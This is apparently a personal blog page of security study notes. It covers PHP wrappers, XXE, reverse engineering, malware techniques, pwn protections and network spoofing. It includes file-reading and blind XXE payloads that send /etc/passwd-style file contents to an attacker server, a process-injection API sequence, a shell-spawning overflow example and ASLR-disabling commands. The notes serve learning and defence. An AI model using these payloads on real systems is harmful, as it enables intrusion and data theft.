---
layout: post
title: "Security Related"
date: 2026-02-25
category: "Terminology"
tags: []
draft: false
toc: true
comments: true
---

# Security Related
<!-- more -->

## 名詞解釋

| Vocabulary    | Def.| Comment|
| - | - | - |
| parse| 解析||
| query| 詢問、請求||
| dump| Also called a crash dump or memory dump, a dump is raw data from a computer's memory. It is written to the file system if software crashes" (terminates unexpectedly). This information is a snapshot of what was going on in the computer at the moment the error occurred. The dump can be analyzed by developers to help track down the error, understand it better, and fix it. | [Refer](https://www.computerhope.com/jargon/d/dump.htm)|
| intruder| 入侵者||
| vulnerability | 漏洞、脆弱||
| exploit| An exploit is a code that takes advantage of a software vulnerability or security flaw. It is written either by security researchers as a proof-of-concept threat or by malicious actors for use in their operations. When used, exploits allow an intruder to remotely access a network and gain elevated privileges, or move deeper into the network.| [Refer](https://www.trendmicro.com/vinfo/us/security/definition/exploit)|
| wrapper| 偽協議||
| cipher| 密碼||
| nerf| cause to be weak or ineffective削弱、減弱| [Refer](https://english.cool/op-nerf-buff/)|
| miscellaneous | 混雜的、各種各樣的||
| PoC| Proof of Concept：在 Binary Exploitation 通常指可以使程式發⽣ Crash 觸發異常的程式碼，⽤來證明程式存在漏洞||
| PWN| 1.具漏洞的服務<br>2.目標在是服務中找到該服務的漏洞並注入自己的程式碼，拿到 server 的控制權| [Refer1](https://csc.nccst.nat.gov.tw/shield.aspx/)<br>[Refer2](https://ithelp.ithome.com.tw/articles/10295763) |
|DHCP|主要功能是自動分配IP(192.168.xxx.xxx)，有時效限制(可能是一天)，當新設備加入區網時，會由DHCP自動分配一個IP給該設備，過了一天後如果設備再次訪問DHCP，則會在給予新的IP，否則該IP會直接回收||
|[Encrypt VS Hash](https://ithelp.ithome.com.tw/articles/10193762)|||
|[CRLF VS LF](http://violin-tao.blogspot.com/2016/04/crlflf-bug.html)|||
|[magic method](https://www.analyticsvidhya.com/blog/2021/07/explore-the-magic-methods-in-python/)|||

## 資安 基本教學
* [惡意程式(malware)](https://ithelp.ithome.com.tw/articles/10282551)
* [不安全的連線？HTTPS與SSL憑證](https://ithelp.ithome.com.tw/articles/10240752)
* [Day 018.聽起來好像很厲害的-密碼學](https://ithelp.ithome.com.tw/articles/10248442)
* [Day21-針對Metasploitable 3進行滲透測試(2)-Shell & Reverse Shell基礎知識](https://ithelp.ithome.com.tw/articles/10278494)
* [[2018iThome鐵人賽]Day6:加密和雜湊有什麼不一樣？](https://ithelp.ithome.com.tw/articles/10193762)
* [[2018iThome鐵人賽]Day 4:如何區分加密、壓縮、編碼](https://ithelp.ithome.com.tw/articles/10193241)
* [Day 21.加密演算法要注意的那些毛(一)-加密模式](https://ithelp.ithome.com.tw/articles/10249953)
* [『Day 27』拜託別Pwn我啦！-常見的工具（下）](https://ithelp.ithome.com.tw/articles/10227380)
* [payload VS formData](https://kknews.cc/zh-tw/code/ogmnm55.html)
* [APT](https://blog.trendmicro.com.tw/?p=123)

## Web 教學
### SQL
* [Day 4 很像走迷宮的sqlmap](https://ithelp.ithome.com.tw/articles/10202811)
* [[Day20]-新手的Web系列SQLmap](https://ithelp.ithome.com.tw/articles/10249489)

### SSTI
* [[Day11]SSTI(Server Side Template Injection)](https://ithelp.ithome.com.tw/articles/10272749)
* [[Day13]-SSTI(Server-side template injection)](https://ithelp.ithome.com.tw/articles/10244403)

### PHP
* [Day 12 - PHP 偽協議 (一) ](https://ithelp.ithome.com.tw/articles/10245020)
* [[Day7]-PHP(LFI/RFI)](https://ithelp.ithome.com.tw/articles/10240486)

#### 偽協議
PHP 偽協議（PHP wrappers / stream wrappers）是指 PHP 內建的一種特殊 URI 協議機制，讓你可以用類似 URL 的方式去讀寫「不同來源」的資料，而不只是單純的檔案。為什麼叫「偽協議」？因為它看起來像：
```
http://
ftp://
```
但其實是：

* PHP 內部 stream wrapper
* 不是網路 protocol
* 只是 PHP 處理資料的一種方式

1. `php://filter`: 👉 CTF 最常出現（LFI 利用）
    範例：
    ```php
    include("php://filter/convert.base64-encode/resource=index.php");
    ```
    作用：

    * 對檔案做轉換
    * 可以 base64 encode 原始碼
    * 常用來繞過 LFI 讀 source code

    典型攻擊如下然後再自己 base64 decode。：
    ```php
    ?page=php://filter/convert.base64-encode/resource=config.php
    ```
2. `php://input`: 用來讀 HTTP request body。
    ```php
    file_get_contents("php://input");
    ```
    常見用途：
    * API 接 JSON
    * CTF 裡配合 `include()` 造成 RCE
3. `php://stdout` / `php://stderr`: CLI 環境用。
4. `php://memory` / `php://temp`: 建立記憶體中的暫存檔案。
5. `file://`: 其實是一般檔案讀取。
    ```html
    file:///etc/passwd
    ```
6. `phar://`: `phar`本身是一個php特殊的**壓縮文件**，打包多個php資源到一個 `*.phar`，而`phar://`就是用來讀取phar內容的wrapper，所以利用`phar://`讀取phar file時，會直接對其metadata反序列化
    * **PHP8.0以前**，這是高階但現在堪用的技巧，因為PHH8.0之後這個features就被改掉了。可以透過反序列化觸發 object injection。凡是只要能夠1)檔案可控 2)用讀檔的任意function讀取，就有機會觸發
    * 常見的讀檔function
        ```
        unlink
        include
        file_get_contents
        getimagesize
        file_exists("phar://evil.phar/test.txt");
        ```

### XXE
#### 名詞解釋
* Document Type Definition(DTD):　用來定義 XML 文件的結構規則
    * 沒有DTD的xml
        ```xml
        <creds>
        <user>admin</user>
        </creds>
        ```
    * 有DTD的xml
        ```xml
        <!DOCTYPE creds [
        <!ELEMENT creds (user)>
        <!ELEMENT user (#PCDATA)>
        ]>
        <creds>
        <user>admin</user>
        </creds>
        ```
        這段 DTD 在說：creds 裡面必須有 user，並且user 只能是文字
* DOCTYPE: 用來「宣告」這份 XML 使用哪個 DTD
    * Inline: DTD 直接寫在 XML 裡。
        ```xml
        <!DOCTYPE creds [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        ```
    * External: 從外部引入DTD
        ```xml
        <!DOCTYPE creds SYSTEM "http://example.com/test.dtd">
        ```
        代表去下載 test.dtd ，再用裡面的規則
* ENTITY: XML 裡面可以被「替換成其他內容」的變數，就像 XML 的「巨集（macro）」或「替換符號」。
    * 內建的 ENTITY

        | Entity  | 代表  |
        | ------- | --- |
        | `&lt;`  | `<` |
        | `&gt;`  | `>` |
        | `&amp;` | `&` |
    * 自定義 ENTITY
        ```xml
        <!DOCTYPE creds [
        <!ENTITY name "test">
        ]>
        <creds>
        <user>&name;</user>
        </creds>
        ```
        解析後
        ```xml
        <user>test</user>
        ```
    * 外部 ENTITY (External Entity): 會讀檔案或 URL。
        ```xml
        <!DOCTYPE creds [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <creds>
        <user>&xxe;</user>
        </creds>
        ```
        當看到 `&xxe;` 就去讀 `/etc/passwd `再把內容塞進來

#### 實際攻擊
XXE 不是 XML 漏洞。而是 XML parser 被允許解析 external entity，如果讀的檔案是個機敏資料，並且有機會顯示出來，那就會是漏洞

#### Blind XXE
有 XXE 漏洞但伺服器「沒有把讀到的資料回顯給你」
* Payload
    ```xml
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE roottag [
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///path/to/file">
    <!ENTITY % dtd SYSTEM "http://0.0.0.0:5000/evil.xml">
    %dtd:
    ]>

    <roottag>&send;</roottag>
    ```
* evil.xml
    ```xml
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://0.0.0.0:5000/?%file;'>">
    %all;
    ```
這是一個<span style="background-color: yellow">標準 Blind XXE + 外部 DTD + OOB 外帶資料</span>的完整攻擊範例

1. 送惡意 XML: 也就是主要payload，
2. 伺服器讀取本地檔案: `%file` 利用php filter wrapper讀取 /path/to/file
3. Base64 編碼
4. 載入外部 DTD（evil.xml）: 因為執行到主要payload的`%dtd`變數
5. evil.xml 建立新的 entity: 定義 `%all`並且`%file`會先展開
6. 伺服器對攻擊者發 HTTP request
7. 攻擊者收到檔案內容: 攻擊者的server log會看到`%file` → base64-encode(file:///path/to/file)

#### 為什麼要分成兩段？
因為：在 XML 規範中
> 不能在內部 DTD 直接把 %file 放進 SYSTEM URL，很多 parser 會擋

也就是不能
```xml
<!DOCTYPE roottag [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY send SYSTEM "http://attacker.com/?x=%file;">
]>

不會變成 → http://attacker.com/?x=(/etc/passwd內容)
```
我們的目的是要達到**字串拼接**並且把內容傳送出來，所以要：
1. 在主 DTD 定義 %file
2. 載入外部 DTD
3. 在外部 DTD 裡組合 URL

這樣才能成功。

### 其他
* [LFI VS RFI](https://ithelp.ithome.com.tw/articles/10240486): LFI(Local File Inclusion)<br>產生的原因是程式設計師未檢查用戶輸入的參數，導致駭客可以讀取server上的敏感文件。開發人員可能貪圖方便，將GET或POST參數直接設定為檔案名稱，直接include該檔案進網頁裡，結果就造成了引入其他檔案，造成資訊洩漏<br><br>RFI(Remote File Include)<br>基本上與LFI概念一樣，只是include的file來源變成從外部引入，觸發條件必須要把php設定參數 `allow_url_include` 設定為 `ON`
* [[Day23]forensics的開始](https://ithelp.ithome.com.tw/articles/10208651)

## Reverse
* [[Day10]格式透視-解析PE文件格式（前篇）](https://ithelp.ithome.com.tw/articles/10187490)
* [[Day17] 行為分析－成為逆向大師的第一步－秒懂加殼技術](https://ithelp.ithome.com.tw/articles/10188209)


|Section| Perm|Description|
|---|---|---|
|.text|R-X|Executable Code (Instructions)|
|.data |RW-| Global with initial data|
|.rodata| R— ReadOnly Data|
|.bss |RW- |Global without initial data|

* Source code → ELF
    <img src="/assets/posts/Terminology/Security Related - Source to ELF.png" width=300>
* ELF → Process
    <img src="/assets/posts/Terminology/Security Related - ELF to Process.png" width=300>

### DLL Reverse
可以直接在IDA中使用\[Ctrl+E\]找Entry Point會方便很多
```
_DllMainCRTStartup → 
DllMain / DllEntryPoint / CRT_INIT (function signature 相同，找有三個參數的 function call)
```
例子
```c
__int64 __fastcall _DllMainCRTStartup(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  ...
  if ( fdwReason - 1 <= 1 )
  {
    if ( !(unsigned int)CRT_INIT(hinstDLL, fdwReason, lpvReserved) )
      goto LABEL_7;
    if ( !(unsigned int)DllEntryPoint(hinstDLL, fdwReason, lpvReserved) )
    {
      if ( fdwReason == 1 )
LABEL_6:
        CRT_INIT(hinstDLL, 0i64, lpvReserved);
LABEL_7:
      v7 = 0;
    }
  }
  v8 = DllMain(hinstDLL, fdwReason, lpvReserved);
}
```

### Calling Convention
#### x86
* Linux:
    
    x86 呼叫慣例⼤部分會將 Parameters 往 Stack 上⾯堆，回傳值放到 edx:eax (超過 32bit 的話): stdcall, fastcall, thiscall, cdcel, …
    * fastcall
        * 前兩個參數分別放於 ecx, edx
        * 其他都堆到 Stack 上
    * stdcall
        * 在 Win32 上⾯⽤的
        * 參數全都堆到 Stack 上⾯
        * 由 Callee 做 Stack Cleanup
* Windows: stdcall, fastcall, thiscall, cdcel, …
    * [MSDN — Argument Passing and Naming Conventions](https://learn.microsoft.com/en-us/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170)

#### x64
* Linux: x64 則是依賴 Register 傳參
    * Syscall Number: RAX
    * Parameters: RDI, RSI, RDX, r10, r8, r9, Stack
    * Return Value: RAX
* Windows:
    * 前四個依序放入 rcx, rdx, r8, r9
    * 其餘放上 stack
    * [MSDN — x64 calling convention](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170)

#### C ABI
* Return Value: RDX:RAX
* Parameters: RDI, RSI, RDX, RCX, r8, r9, Stack

#### Function Epilogue / Function Prologue
Stack Register
* SP(Stack Pointer Register)
    * 指向 Stack Frame 的頂端
* BP(Stack Base Pointer Register)
    * 指向 Stack Frame 的底部
```
// Function Epilogue
endbr64
push rbp
mov rbp, rsp
sub rsp, 30h
mov rax, fs:28h

// Function Prologue
leave // = mov $rsp, $rbp; pop $rbp;`
retn // = pop $rip
```

### Windows API v.s. Linux Glibc

|Operating System | Windows | Linux|
|---|---|---|
|OS API| Windows API| GNU C Library|
|Library | System DLLs (e.g. kernel32.dll) | libc.so.6|
|Library Format | .dll (PE) | .so (ELF)|
|Documentation |MSDN| man page|

### Naming Convention
* API 命名：Upper Camel Case
    * Suffix
        * A：字串參數為 ANSI char
        * W：字串參數為 Wide char
        * Ex：提供更多控制參數 (EXtend)
    * Prefix
        * Nt：Native APIs

### Callback Function
什麼是 Callback Function？Callback function（回呼函式） 是：把「一個函式」當作參數傳給別人，等到某個事件發生時，由對方再「呼叫回來」。
```c
#include <stdio.h>

void myCallback() {
    printf("被呼叫了！\n");
}

void doSomething(void (*callback)()) {
    printf("先做事情...\n");
    callback();  // 呼叫回呼函式
}

int main() {
    doSomething(myCallback);
}
```

#### 為什麼需要 Callback？
因為有些事情：
* 什麼時候發生不知道
* 不是你主動控制
* 是「事件驅動」
 
如果是 GUI 程式（例如在 Microsoft Windows），假設不用 callback，你會被迫寫：
```c
while (1) {
    if (按鈕被點) {
        doSomething();
    }
}
```

問題是
* ❌ CPU 會一直跑
* ❌ 效率差
* ❌ 程式很醜
* ❌ 很難擴充

#### APC (Asynchronous Procedure Call)
在thread中非同步執行的callback function，用 QueueUserAPC 註冊，**一種讓「某個 thread 在稍後安全時機執行指定函式」的機制。**
* 👉 不是立刻打斷執行
* 👉 而是在「thread 進入可被插入的狀態」時執行
* 觸發 callback 時機
    * 當 thread 處於 alertable state 時，也就是安全的時機點，例如：
        ```
        SleepEx
        WaitForSingleObjectEx
        SignalObjectAndWait
        MsgWaitForMultipleObjectsEx
        WaitForMultipleObjectsEx
        ```
        此時Windows 會檢查 APC queue，有的話就執行
    * thread 初始化時

```
Thread 正常跑
        ↓
呼叫 SleepEx(..., TRUE)
        ↓
Kernel 檢查 APC queue
        ↓
有 APC → 執行 APC 函式
        ↓
執行完回到原本程式
```

* 為什麼需要 APC？
    
    想像這種情況：Kernel 想通知某個 user thread 做事，但不能直接中斷它（避免破壞執行狀態），需要等「安全點」再執行，這時就用 APC。

* Malware會用的技巧
    * Process Injection 技術: <span style="background-color: yellow">APC Injection</span>

        攻擊流程：
        ```
        OpenProcess
        VirtualAllocEx
        WriteProcessMemory
        QueueUserAPC
        ResumeThread
        ```
        把 shellcode 排入 target thread 的 APC queue。當 thread 進入 alertable state：👉 shellcode 執行
    * DLL Injection
    * Early Bird APC Injection
    * Process Hollowing
    * Reflective DLL Injection

#### TLS Callback - [MSDN](https://learn.microsoft.com/zh-tw/windows/win32/debug/pe-format#tls-callback-functions)
先講TLS(Thread Local Storage，不是指網路介面的Transport Layer Security)是什麼?<span style="background-color: yellow">**也就是每個執行緒都有自己「獨立的一份變數」**</span>

假設如果是多執行緒：
```c
int counter = 0;
```
Thread A 改 counter，Thread B 也改 counter，就會互相干擾。所以TLS可以讓thread A/B各自擁有獨立的`counter`，範例如下
```c
__declspec(thread) int counter = 0;
```

* 在 Microsoft Windows：TLS 是存在TEB (Thread Environment Block)，在PE檔案中，會有TLS Directory，利用PE-bear/IDA/x64dbg等工具看出來
* TLS Callback: thread會在**entry point之前**執行的callback function，這在 malware 裡超常見。
    ```
    Program start
        ↓
    TLS callback 先執行
        ↓
    然後才到 EntryPoint
    ```

## Malware Reverse
1. 初始存取 & 執行: 利用釣魚郵件
2. Defense Evasion: 惡意程式用來「躲避偵測、分析、或防毒軟體」的技術
    1. [將惡意程式設為隱藏檔案](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfileattributesa)
    2. 執行後刪除惡意程式
    3. 關閉、打下防毒軟體
    4. 清除 Windows Event Log
    
    * [Att&CK - T1480 (Execution Guardrails)](https://attack.mitre.org/techniques/T1480/): 只在環境符合特定條件時執行，針對特定對象進行攻擊，常見條件：漏洞、系統語言、時間、Hostname...
        ```
        SystemTimeToFileTime
        CreateWaitableTimerW
        SetWaitableTimer
        WaitForSingleObject
        ```
    * [Att&CK - T1497 (Virtualization/Sandbox Evasion)](https://attack.mitre.org/techniques/T1497/): 偵測若處於 VM 或是自動化分析環境之中，則改變 / 隱藏惡意行為，常見偵測項目：網卡、memory 大小、分析工具、延遲執行
    * [Att&CK - T1027.009 (Obfuscated Files or Information: Embedded Payload)](https://attack.mitre.org/techniques/T1027/009/): 真正的malware file會embedded在啟動的檔案中，避免一落地被偵測到，所以落地後需要經過一系列的extract或解密
    * [Att&CK - T1055 (Process Injection)](https://attack.mitre.org/techniques/T1055/): 把程式碼注入到其他 process 的手法，不會建立獨立的 process，而是把惡意行為隱藏在正常 process 中，以躲避 process 級別的偵測，若能注入高權限 process，則有機會提權
        ```
        VirtualAllocEx
        WriteProcessMemory
        CreateRemoteThread
        ```
        一般程式較少對其他 process 做寫入和建立 thread，使用這些 API 十分容易被偵測
3. 持續潛伏 Persistence
    5. 註冊 scheduled task，定期執行惡意程式
    6. 建立後門帳號

    * [Att&CK - T1547 (Boot or Logon Autostart Execution)](https://attack.mitre.org/techniques/T1547/): 當malware落地後並且被執行，就要把自己複製到startup folder，並且設定自己的權限
        ```
        GetModuleFileNameA
        GetUserNameA
        CopyFileA
        SetFileAttributesA
        ```
    * [Att&CK - T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder)](https://attack.mitre.org/techniques/T1547/001/)
    * [Att&CK - T1543.003 (Create or Modify System Process: Windows Service)](https://attack.mitre.org/techniques/T1543/003/)
    * [Att&CK - T1053.005 (Scheduled Task/Job: Scheduled Task)](https://attack.mitre.org/techniques/T1053/005/)
4. 權限提升 Privilege Escalation
    7. 利用漏洞將使用者提權至 Administrator
5. 憑證存取 Credential Access
    8. 從作業系統取得明文密碼、NTLM hash
6. 探索 Discovery
    9. 掃描系統上的帳號，內網中的網路服務、芳鄰、其他機器
7. 橫向移動 Lateral Movement
    10. 透過 RDP、WinRM ，利用已取得的 credential 或本身權限移動至其他機器
8. 蒐集 Collection
    11. 蒐集文件、瀏覽器、Email、剪貼簿等資料

    * [Att&CK - T1115 (Clipboard Data)](https://attack.mitre.org/techniques/T1115/): 收集複製貼上的內容，如果剛好複製了帳號、密碼、信用卡號就
9. 指揮與控制 Command & Control (C2)
    12. 與攻擊者的 C2 server 連線，取得後續指令
10. 滲出 Exfiltration
    13. 將資料透過連線傳回攻擊者的 C2 server

### PE File Format
* VA(Virtual Address) = ImageBase(映射到process memory的起始位址) + RVA(Relative Virtual Address，位移): ImageBase：PE 映射至 process memory 中的位址
    <img src="/assets/posts/Terminology/Security Related - RVA VA.png" width=300>
* Windows 版本的ELF
    <img src="/assets/posts/Terminology/Security Related - PE Format.png" width=300>
    * DOS Header, Stub：向下相容 DOS，大多數欄位無用
        * 0x00: "MZ" (0x5A4D) 字串，Magic number，用於標示 PE 的起始點
        * 0x3C: e_lfanew，NT Headers 的 file offset
    * NT Headers = File Header + Optional Header：紀錄檔案及 loader 載入時所需的 metadata
        * 執行所需的系統架構
        * 編譯時間
        * ImageBase
        * 程式進入點 (Address of Entrypoint)
        * enable / disable ASLR
        * Import, Export, Relocation Table
    * Section Headers：紀錄各 section 的 metadata
    * Section Data：各 section 資料
    * .text, .data, .idata, …

### Dynamic API Resolution
實務上非常重要，詳細說明看[Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background) ]({{base.url}}/Simple-Reverse-0x24(2023-Lab-WinMalware-Dynamic-API-Resolution-Background)/)

## PWN
* [『 Day 26』拜託別 Pwn 我啦！ - 常見的工具 （上） ](https://ithelp.ithome.com.tw/articles/10227326)
* [『Day 27』拜託別Pwn我啦！-常見的工具（下）](https://ithelp.ithome.com.tw/articles/10227380)
* [Day25: [Misc] 我從來沒想過我會害怕寫 code](https://ithelp.ithome.com.tw/articles/10226977)

### ELF Section
* Plt(Procedure Linkage Table): 支援 dynamic linking ，當程式呼叫 external function 時使用。
    * PLT 的作用
        
        假設程式：
        ```c
        main → printf
        ```
        實際流程：
        ```
        main
        ↓
        printf@plt
        ↓
        dynamic linker
        ↓
        real printf (libc)
        ```
    * Lazy Binding: 在 Dynamic Link 的 Binary 中，有些 library function 可能因為程式流程，到執行結束都不會被 call 到

        Lazy Binding 會在 第一次 call 到 library function 的時候才會去找出那個 function 真正的 Address ，找到之後存在 **GOT (Global Offset Table)**，後續如果再 call 到那個 function ，就可以直接從 GOT 得到 Address 。

        plt上的code實際上是直接查詢該function的GOT，然後跳過去GOT上存的Address，GOT一初始存的Address則是會指向一段尋找function Address 的code
* Text: 存放 CPU 會實際執行的程式碼。
* Rodata: Read-Only Data（唯讀資料）
* Data: 已初始化的全域 / 靜態變數
* Bss: 未初始化的全域 / 靜態變數
* Got(Global Offset Table): 紀錄 Library 裡面 function 的實際 Address，在該 function 都沒被 call 過時，會是存一個位於 plt 段的 Address 可以利用 GOT 來 leak libc 的 base
    * PLT 會透過 GOT 找到真正函式。
        ```
        printf → libc address
        malloc → libc address
        ```
        結構
        ```
        PLT
        ↓
        GOT entry
        ↓
        actual function
        ```
* Init fini

### Stack Frame
<img src="/assets/posts/Terminology/Security Related - PWN Stack Frame.png" width=300>

### `checksec`保護
* No RELRO or Partial RELRO → <span style="background-color: yellow">GOT Hijacking(改寫GOT)</span>
    * No RELRO - link map和GOT都可寫(有lazy binding)
    * Partial RELRO - link map不可寫，GOT可寫(有lazy binding)
    * Full RELRO - link map和GOT都不可寫(事先把library的位置都先resolve完並寫在GOT上，再把GOT權限關掉，比較花時間但安全)
    * 關閉指令：`-z norelro`
* PIE(Position Independent Executable) → <span style="background-color: yellow">BOF(ret2 series)</span>，開啟時，data 段以及 code 段位址隨機化
    * 關閉指令：`-no-pie`
* NX (No eXecute, Data Execution Prevention, DEP) off → 基本上不能直接執行shellcode，但可以用<span style="background-color: yellow">ROP</span>繞過 → 可寫得不可執⾏，可執⾏的不可寫
    * 關閉指令：`-zexecstack`
* ASLR (Address Space Layout Randomization): 記憶體位址隨機變化，每次執⾏時，<span style="background-color: yellow">stack、heap、library</span> 位置都不⼀樣
    * 關閉指令: `sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"`
    * 打開指令: `sudo sh -c "echo 2 > /proc/sys/kernel/randomize_va_space"`
* Stack Canary
    * 關閉指令：`-fno-stack-protector`

### Stack Vulnerability
#### BOF
沒有檢查輸入長度，當輸入的惡意payload蓋到stack上的return address，就有可能RCE
```c
#include <stdio.h>
    void hacked() {
    system("/bin/sh");
}
int main() {
    char str[8];
    gets(str);
}
```

#### ROP(Return Oriented Programming)
就是一大堆在 text segment 的 code 片段，結尾都是`ret` instruction，前面可能會有一些`pop rsp`, `pop rbp`, `jmp`之類的指令，這個好處是可以透過這個feature，達到好幾個不同的攻擊手法
* 用 ROP call mmap 拿到一塊 rwx 的 memory 繞過 NX 保護

#### GOT Hijacking
在RELRO為Partial RELRO的前提下，把 GOT 寫成我們想要的 Address ，然後去 call 該 function 

#### ret2plt
```c
BOF // BOF需要先蓋到stack並且預先做到以下事情
puts@plt(puts@got) // 先利用puts在got上的addrress leak出來 → leak libc
gets@plt(puts@got) // 把puts在got上的address利用gets改掉，改成&system → GOT Hijacking
puts@plt("sh") // 當再次執行puts時，會自動跳到system開shell
```

#### Stack Pivot
如果bof的長度不夠可以考慮的技巧，透過 `leave ; ret` 來控制 stack frame

#### Format String Attack
printf 系列 function 的 format string 可控的惡意利用，也就是如果source code有使用到format類型的print，那麼就有機會利用format本身的特性，leak/write data
* Calling Convention
    * rdi rsi , rdx , rcx , r8, r9, \[rsp\], \[rsp+8\], \[rsp+0x10\],...
    * 前五個 `%p` 會 leak reg ，6th 開始 leak rsp 上的 data
* 若該值為 addr 可透過 `%s` 輸出該地址的 value
* 可以 自行在 stack 上寫入 addr 來做到任意 leak
* •% 可以直接指到第 N 個參數

## Network
### ARP Spoofing
* 攻擊者發送 假的 ARP reply：`192.168.1.1 is attacker_MAC`
* 受害者就會更新 ARP table：`192.168.1.1 → attacker_MAC`
* 結果：Victim → Attacker → Router，所有流量先經過 attacker。

#### 攻擊效果
* MITM（Man in the Middle）
* 竊聽流量
* 修改流量
* Session hijacking
* SSL stripping
* DoS

### DNS Spoofing（DNS Cache Poisoning）
* 攻擊者讓受害者的 DNS 解析結果變成：`bank.com → attacker_IP`
* 結果：使用者訪問：`bank.com`，卻被導向：`attacker server`

#### 攻擊結果
* Phishing
* Credential stealing
* Malware distribution

#### 防禦方法
* DNSSEC
* HTTPS / HSTS
* DNS query randomization
* 不使用不可信 DNS server

### DHCP Spoofing
在同一個 LAN 中，攻擊者架設一個 假的 DHCP server。當 victim 連上網路時：`Victim → DHCP Discover`，攻擊者比真正 DHCP server 更快回應：`Attacker → DHCP Offer`，victim 就會接受 attacker 提供的設定。

#### 攻擊者可以控制什麼
攻擊者可以指定：
* Gateway
* DNS server
* IP address

#### 後續的攻擊手法
* MITM attack: 篡改封包
* DNS Spoofing
* DoS: 給 victim 一個錯誤 gateway：`Gateway = 0.0.0.0`

### SYN Flood
是一種利用 TCP 連線機制的 阻斷服務攻擊（DoS），目的是讓伺服器資源被耗盡，使正常使用者無法建立連線。
> 攻擊者大量發送 SYN 封包，但不完成 TCP 連線，讓伺服器的連線佇列被塞滿。

TCP 建立連線需要 三次握手（Three-way handshake）：
```
Client → Server : SYN
Server → Client : SYN-ACK
Client → Server : ACK
```
完成後：connection established

### 防禦方法
* SYN Cookies: Server 不立即分配資源，而是把資訊放在 cookie。
* Firewall / IDS: `Snort, Suricata`可以偵測 SYN flood pattern。
* Rate limiting: 限制 SYN request 數量。

## 資安工具與平台
### IDS(Intrusion Detection System, 入侵偵測系統)
簡答: 從名字就可以看的出來，他是針對流入流出的各種封包的偵測系統，也就是獨立於Firewall的旁之，如果他有檢測到封包內有什麼異常的Payload或是pattern，就會跳出告警，但就僅只於此，不會再做更多的操作

詳答: [What is IDS(Intrusion Detection Systems)?](https://www.ithome.com.tw/tech/28712)
> 入侵偵測系統（Intrusion Detection System，IDS）是用來偵測資訊系統或網路上潛在的惡意破壞活動
* 網路型入侵偵測系統(NIDS):主要是由一個或多個偵測器，加上收集與分析資料的主控臺所組成，可以分析每個通過的網路封包，並與已知的攻擊特徵進行比對，如果符合某項攻擊特徵，系統就會啟動防護機制，例如發簡訊或命令防火牆中斷該連線。
* 主機型入侵偵測系統(HIDS):是從主機系統稽核日誌檔演進而來，必須在主機上安裝代理程式﹙Agent﹚，負責監視主機內部的程序，並監控記錄檔與可疑活動，若有任何系統事件都會被記錄至日誌檔，並與攻擊特徵資料庫比對，判斷主機是否遭到攻擊
* 誘捕型入侵偵測系統(Deception Systems):目的是偵測未經授權的活動，任何進出誘捕系統的封包都會被認定是可疑的。但它卻是受到爭議的產品，有些廠商認為誘捕型系統只適合學術研究，因為它誘導駭客上勾，因此收集的證據無法用來起訴駭客

### IPS(Intrusion Prevention System, 入侵防禦系統)
IPS就是要改進上述的問題，他主打的就是偵測到快快的東西就會主動的防禦掉，但這樣還是有一個問題，現今的攻擊手法越來越多種，而且有時候是那種可以包裝成安全落地的形式，必須要在本地端監控才有辦法知道

### EDR(Endpoint Detection and Response, 端點偵測與應對)
EDR就是在做這樣的事情，可是有可能會有一個疑問，每個人的主機內不是都有安裝那種傳統的Windows Defenders或是小紅傘那種東西，為什麼還需要有EDR，其實現今的攻擊手法已經有很大的變化，有可能單純看個人的裝置會看不出個所以然，必須要聯合其他的裝置一起做關聯性的比對才會知道目前是不是正在遭受攻擊，所以EDR強大的地方在於他做到各個裝置endpoint端點的串聯，讓資安事件的偵測和防禦可以更嚴謹，這也是中小型企業最需要的資安產品

### MDR(Managed Detection and Response, 受管式偵測與應對)
這東西其實就是一個EDR+SOC的服務衍生的產品，但ddaa說這個東西要做出市場區隔可能還沒有到太創新

### NSM(Network Security Monitors)
資料來源: [NSM 02: 網路安全監控概論之一](https://ithelp.ithome.com.tw/articles/10202297)
> NSM主要目的是偵測、找出入侵者，提高能見度。它建立在「我們一定會被攻擊，而且最終防禦一定會被突破」的思惟上。假設意志堅決的駭客最終打穿我們辛苦建立的防禦，但只要能在入侵者進一步破壞、感染系統前偵測、做出回應，讓入侵者無法達到目的，便能阻擋這波攻擊
> NSM不是等接收IDS/IPS等等資安設備觸發警示後才開始收集，而是平時便預先主動收集資料，提供NSM平台審視、分析，強化可見度，主動找出入侵軌跡

### SIEM(Security Information and Event Management)
資料來源: [Day 15 機器幫你管日誌： SIEM 安全資訊事件管理系統 (1) ](https://ithelp.ithome.com.tw/articles/10195623)
> SIEM的功能和一般日誌管理工具類似，都會將來自不同伺服器和設備的日誌和事件紀錄集中在一個地方 (通常是Log server伺服器本身硬碟或特定的儲存池Storage pool)，避免日誌和紀錄隨著機器故障遺失，符合稽核要求，可以進行關鍵字或日期查詢，所以也有人直接用日誌管理工具來進行分析
功能
* 彙整、解讀多項系統設備日誌
* 資料圖形化
* SIEM具備強大的比對Correlation 功能: e.g.帳號登入失敗、創建新帳號、帳號權限提升等等可能是攻擊行為也可能是網管的正常登入，要看一連串的流量或封包資料才能判斷$\to$耗費人力
* 整合其他資安工具或資安服務